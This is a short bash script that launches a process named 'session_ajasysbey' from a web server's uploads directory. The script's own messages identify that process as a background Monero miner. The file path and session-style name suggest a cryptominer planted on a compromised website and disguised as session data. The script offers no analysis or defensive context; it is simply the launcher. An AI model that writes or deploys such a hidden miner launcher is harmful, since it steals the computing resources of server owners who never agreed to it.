#!/bin/bash
if ! pidof session_ajasysbey >/dev/null; then
  nice /var/www/html/colortech/api/uploads/ransom/tmp/sess_aksd19sb187ss1ia901b23/session_ajasysbey $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall session_ajasysbey\" or \"sudo killall session_ajasysbey\" if you want to remove background miner first."
fi
